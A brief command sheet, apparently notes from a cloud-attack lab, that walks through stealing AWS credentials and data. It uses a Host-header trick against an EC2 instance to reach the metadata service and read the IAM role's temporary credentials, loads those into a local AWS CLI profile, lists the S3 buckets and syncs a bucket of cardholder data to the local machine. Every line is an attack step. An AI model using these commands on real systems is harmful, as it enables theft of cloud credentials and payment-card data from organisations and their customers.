to get role name: `curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'`
​
to get credentials: `curl http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254'`
​
to configure AWS profile: `aws configure --profile erratic`
​
to add AWS session token into .aws/credentials under erratic profile: `aws_session_token = <session-token>`
​
to list S3 buckets: `aws s3 ls --profile erratic`
​
to sync S3 bucket: `aws s3 sync s3://<bucket-name> ./cardholder-data --profile erratic`